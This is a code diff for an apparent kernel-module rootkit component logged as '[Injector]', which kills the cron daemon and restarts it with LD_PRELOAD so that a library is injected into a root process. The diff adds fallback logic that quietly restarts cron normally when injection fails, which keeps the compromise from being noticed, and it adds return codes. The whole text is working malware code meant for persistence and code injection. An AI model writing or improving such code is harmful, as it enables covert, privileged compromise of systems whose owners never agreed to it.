@@ -25,7 +25,7 @@ static void wait_for_process_exit(pid_t pid, int timeout_ms)
     }
 }
 
-static void kill_cron_and_restart_with_preload(void)
+static int kill_cron_and_restart_with_preload(void)
 {
     struct task_struct *task;
     int ret = SUCCESS;
@@ -55,7 +55,16 @@ static void kill_cron_and_restart_with_preload(void)
 
                 ret = call_usermodehelper(CRON_PATH, argv, envp, UMH_WAIT_PROC);
                 if (ret != 0)
+                {
                     DBG_PRINT("[Injector] Failed to restart cron with LD_PRELOAD: %d\n", ret);
+                    char *argv[] = {CRON_PATH, NULL};
+                    char *envp[] = {
+                        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+                        NULL
+                    };
+                    call_usermodehelper(CRON_PATH, argv, envp, UMH_WAIT_PROC);
+                    return ret;
+                }
                 else
                     DBG_PRINT("[Injector] Restarted cron with LD_PRELOAD\n");
 
@@ -63,6 +72,7 @@ static void kill_cron_and_restart_with_preload(void)
             }
         }
     }
+    return ret;
 }
 
 static void cleanup_cron_injection(void)
@@ -123,13 +133,19 @@ static void cleanup_cron_injection(void)
 
 int injector_init(void)
 {
+    int ret = SUCCESS;
     if (!injector_initialized)
     {
         DBG_PRINT("[Injector] Loaded: replacing cron...\n");
-        kill_cron_and_restart_with_preload();
+        ret = kill_cron_and_restart_with_preload();
         injector_initialized = true;
     }
-    return SUCCESS;
+    else
+    {
+        DBG_PRINT("[Injector] Already initialized\n");
+        ret = -1; // Already initialized
+    }
+    return ret;
 }
 
 void injector_cleanup(void)
